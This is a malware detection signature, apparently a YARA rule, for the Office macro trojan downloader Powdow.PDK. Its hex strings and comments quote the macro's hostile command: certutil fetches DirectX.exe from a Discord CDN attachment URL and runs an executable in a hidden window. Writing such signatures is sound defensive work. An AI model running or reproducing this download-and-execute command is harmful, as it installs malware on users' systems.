
rule TrojanDownloader_O97M_Powdow_PDK_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PDK!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 63 64 6e 2e 64 69 73 63 6f 72 64 61 70 70 2e 63 6f 6d 2f 61 74 74 61 63 68 6d 65 6e 74 73 2f 39 33 30 31 33 38 38 33 36 31 35 34 30 37 33 31 38 32 2f 39 33 33 35 31 38 39 36 31 36 39 32 32 34 36 30 32 36 2f 44 69 72 65 63 74 58 2e 65 78 65 22 22 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""https://cdn.discordapp.com/attachments/930138836154073182/933518961692246026/DirectX.exe""
		$a_01_1 = {26 26 20 51 64 6c 6d 6d 69 73 78 7a 73 68 71 6a 75 7a 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 && Qdlmmisxzshqjuz.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}